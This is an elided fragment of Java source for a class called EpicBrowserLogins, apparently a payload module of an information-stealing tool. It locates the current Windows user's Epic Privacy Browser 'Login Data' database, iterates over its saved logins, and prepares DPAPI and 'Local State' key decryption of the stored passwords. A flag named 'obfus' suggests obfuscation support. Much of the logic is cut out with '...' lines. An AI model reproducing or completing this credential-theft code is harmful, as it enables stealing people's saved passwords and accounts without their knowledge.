...
public class EpicBrowserLogins implements IPayload
{
    ...
    public void run() {
        ...
        try {
            ...
            final ArrayList<String> list = getEpicInfo();
    ...
    public static ArrayList<String> getEpicInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Epic Privacy Browser\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && EpicBrowserLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)EpicBrowserLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(EpicBrowserLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Epic Privacy Browser\\User Data\\Local State";
        EpicBrowserLogins.shorten = true;
        EpicBrowserLogins.obfus = false;
    }
}
